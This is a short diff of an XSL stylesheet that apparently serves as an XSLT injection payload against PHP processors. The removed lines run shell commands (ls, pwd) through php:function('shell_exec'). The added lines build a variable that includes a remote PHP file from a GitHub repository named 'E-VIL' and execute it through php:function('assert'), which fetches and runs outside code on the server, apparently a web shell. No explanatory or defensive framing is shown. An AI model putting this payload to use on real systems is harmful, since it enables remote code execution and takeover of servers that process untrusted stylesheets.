@@ -3,10 +3,11 @@
 <body style="font-family:Arial;font-size:12pt;background-color:#000000">
     <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
     <p>
-    <xsl:value-of select="system-property('xsl:vendor')"/>
-    <xsl:value-of select="php:function('shell_exec','ls')" />
-    <xsl:value-of select="php:function('shell_exec','pwd')" />
-    <xsl:value-of select="php:function('shell_exec','echo test')" />
+        <xsl:value-of select="system-property('xsl:vendor')"/>
+	        <xsl:variable name="payload">
+			    include("https://raw.githubusercontent.com/GotokuNeko/E-VIL/main/e-vil.php")
+	        </xsl:variable>
+	    <xsl:variable name="include" select="php:function('assert',$payload)"/>
     </p>
 </body>
 </html> 
